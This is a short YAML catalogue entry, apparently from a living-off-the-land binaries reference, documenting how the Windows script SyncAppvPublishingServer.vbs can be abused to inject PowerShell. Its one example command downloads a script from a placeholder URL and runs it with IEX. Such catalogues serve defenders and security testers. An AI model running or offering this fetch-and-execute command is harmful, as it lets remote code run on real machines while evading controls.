---
name: syncappvpublishingserver.vbs
description: 
functions:
  execute:
    - description: Inject PowerShell script code with the provided arguments
      code: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
resources: 
    - resource: https://twitter.com/monoxgas/status/895045566090010624
    - resource: https://twitter.com/subTee/status/855738126882316288
fullpath: 
    - path: C:\Windows\System32\SyncAppvPublishingServer.vbs
notes: Thanks to Nick Landers - @monoxgas, Casey Smith - @subTee
---